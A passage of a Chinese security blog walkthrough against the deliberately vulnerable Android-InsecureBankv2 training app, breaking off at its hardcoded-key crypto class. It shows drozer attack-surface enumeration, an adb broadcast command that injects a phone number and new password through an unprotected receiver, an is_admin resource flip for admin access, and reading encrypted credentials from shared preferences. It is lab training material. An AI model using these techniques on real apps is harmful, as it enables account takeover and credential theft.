@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>insecurebankv2之演练 | lufei&#39;s blog</title>
+  <meta name="description" content="0x00 前言对Android-InsecureBankv2演练apk进行测试。 地址：https:&#x2F;&#x2F;github.com&#x2F;dineshshetty&#x2F;Android-InsecureBankv2 首先收集权限信息 1234567891011121314151617181920212223242526272829303132333435dz&gt; run app.package.info -a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="insecurebankv2之演练">
+<meta property="og:url" content="https://lufe1.cn/2017/10/11/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/index.html">
+<meta property="og:site_name" content="lufei&#39;s blog">
+<meta property="og:description" content="0x00 前言对Android-InsecureBankv2演练apk进行测试。 地址：https:&#x2F;&#x2F;github.com&#x2F;dineshshetty&#x2F;Android-InsecureBankv2 首先收集权限信息 1234567891011121314151617181920212223242526272829303132333435dz&gt; run app.package.info -a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/1.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/2.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/3.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/4.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/5.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/6.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/7.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/8.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/9.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/10.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/11.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/12.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/13.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/14.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/15.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/16.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/17.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/18.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/19.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/20.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/21.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/22.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/23.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/24.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/25.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/26.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/27.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/28.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/29.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/30.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/31.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/32.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/33.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/34.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/35.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/36.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/37.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/38.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/39.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/40.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/41.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/42.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/43.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/44.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/45.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/46.png">
+<meta property="og:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/47.png">
+<meta property="article:published_time" content="2017-10-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-02T16:06:17.038Z">
+<meta property="article:author" content="lufei@湘ICP备17016147号-1">
+<meta property="article:tag" content="Android">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/1.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://lufe1.cn/2017/10/11/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="lufei&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/lufeirider" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">lufei</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">网络安全</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81/">代码</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/">原创工具</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/">工具修改</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">恶意代码分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E5%B7%A7/">技巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8C%96%E6%B4%9E/">挖洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90/">权限</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%B1%E5%A3%B3/">脱壳</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%98%B2%E5%BE%A1/">防御</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81/" rel="tag">代码</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/" rel="tag">原创工具</a><span class="tag-list-count">25</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/" rel="tag">工具修改</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" rel="tag">恶意代码分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%96%E6%B4%9E/" rel="tag">挖洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90/" rel="tag">权限</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3/" rel="tag">脱壳</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%98%B2%E5%BE%A1/" rel="tag">防御</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-insecurebankv2之演练" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      insecurebankv2之演练
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2017/10/11/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/" class="article-date">
+	  <time datetime="2017-10-10T16:00:00.000Z" itemprop="datePublished">2017-10-11</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/Android/">Android</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/Android/" rel="tag">Android</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2017/10/11/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>对Android-InsecureBankv2演练apk进行测试。</p>
+<p>地址：<br><a target="_blank" rel="noopener" href="https://github.com/dineshshetty/Android-InsecureBankv2">https://github.com/dineshshetty/Android-InsecureBankv2</a></p>
+<p>首先收集权限信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.info -a  com.android.insecurebankv2</span><br><span class="line">Package: com.android.insecurebankv2</span><br><span class="line">  Application Label: InsecureBankv2</span><br><span class="line">  Process Name: com.android.insecurebankv2</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: /data/data/com.android.insecurebankv2</span><br><span class="line">  APK Path: /data/app/com.android.insecurebankv2-1.apk</span><br><span class="line">  UID: 10048</span><br><span class="line">  GID: [3003, 1015, 1028]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.SEND_SMS</span><br><span class="line">  - android.permission.USE_CREDENTIALS</span><br><span class="line">  - android.permission.GET_ACCOUNTS</span><br><span class="line">  - android.permission.READ_PROFILE</span><br><span class="line">  - android.permission.READ_CONTACTS</span><br><span class="line">  - android.permission.READ_PHONE_STATE</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.READ_CALL_LOG</span><br><span class="line">  - android.permission.ACCESS_NETWORK_STATE</span><br><span class="line">  - android.permission.ACCESS_COARSE_LOCATION</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dz&gt; run app.package.attacksurface com.android.insecurebankv2</span><br><span class="line">Attack Surface:</span><br><span class="line">  5 activities exported</span><br><span class="line">  1 broadcast receivers exported</span><br><span class="line">  1 content providers exported</span><br><span class="line">  0 services exported</span><br><span class="line">is debuggable</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="0x01-Flawed-Broadcast-Receivers"><a href="#0x01-Flawed-Broadcast-Receivers" class="headerlink" title="0x01 Flawed Broadcast Receivers"></a>0x01 Flawed Broadcast Receivers</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.info -a com.android.insecurebankv2</span><br><span class="line">Package: com.android.insecurebankv2</span><br><span class="line">  com.android.insecurebankv2.MyBroadCastReceiver</span><br><span class="line">Permission: null</span><br></pre></td></tr></table></figure>
+
+<p>代码如下：</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/1.png" alt="1.png" title="1.png"></p>
+<p>使用adb shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver --es phonenumber &quot;15555215554&quot; --es newpass &quot;Jack@123$&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-Intent-Sniffing-and-Injection"><a href="#0x02-Intent-Sniffing-and-Injection" class="headerlink" title="0x02 Intent Sniffing and Injection"></a>0x02 Intent Sniffing and Injection</h1><p>根据下面的截图里面的参数<br><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/2.png" alt="2.png" title="2.png"></p>
+<p>写如下的代码。<br>代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">String phn = intent.getStringExtra(<span class="string">&quot;phonenumber&quot;</span>);</span><br><span class="line">String newpass = intent.getStringExtra(<span class="string">&quot;newpass&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (phn != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Intent bintent = <span class="keyword">new</span> Intent(context, MainActivity.class);</span><br><span class="line">        bintent.putExtra(<span class="string">&quot;phonenumber&quot;</span>, phn);</span><br><span class="line">        bintent.putExtra(<span class="string">&quot;newpass&quot;</span>,newpass);</span><br><span class="line">        </span><br><span class="line">        bintent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); </span><br><span class="line">        context.startActivity(bintent);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Phonenumber:&quot;</span>+phn);</span><br><span class="line">        System.out.println(<span class="string">&quot;newpass:&quot;</span>+newpass);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Phone number is null&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接受phonenumber 和 newpass这两个字段的信息。</p>
+<h1 id="0x03-Weak-Authorization-mechanism"><a href="#0x03-Weak-Authorization-mechanism" class="headerlink" title="0x03 Weak Authorization mechanism"></a>0x03 Weak Authorization mechanism</h1><p>在LoginActivity.java 发现</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/3.png" alt="3.png" title="3.png"></p>
+<p>跟进一下button_CreateUser点击事件是干什么</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/4.png" alt="4.png" title="4.png"></p>
+<p>再跟进createUser 函数</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/5.png" alt="5.png" title="5.png"></p>
+<p>只要我们修改字符串资源里面的is_admin就可以了。</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/6.png" alt="6.png" title="6.png"></p>
+<p>就可以使用管理员的功能了。</p>
+<h1 id="0x04-Local-Encryption-issues-Weak-Cryptography-implementation-Hardcoded-secrets"><a href="#0x04-Local-Encryption-issues-Weak-Cryptography-implementation-Hardcoded-secrets" class="headerlink" title="0x04 Local Encryption issues+Weak Cryptography implementation+Hardcoded secrets"></a>0x04 Local Encryption issues+Weak Cryptography implementation+Hardcoded secrets</h1><p>cd /data/data/com.android.insecurebankv2/shared_prefs</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/7.png" alt="7.png" title="7.png"></p>
+<p>分别打开了两个文件</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/8.png" alt="8.png" title="8.png"></p>
+<p>发现 SharedPreferences.xml 里面有敏感消息，可是加密的。</p>
+<p><img src="https://image.lufe1.cn/insecurebankv2%E4%B9%8B%E6%BC%94%E7%BB%83/9.png" alt="9.png" title="9.png"></p>
+<p>找到加密类<br>CryptoClass.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    The super secret key used by the encryption 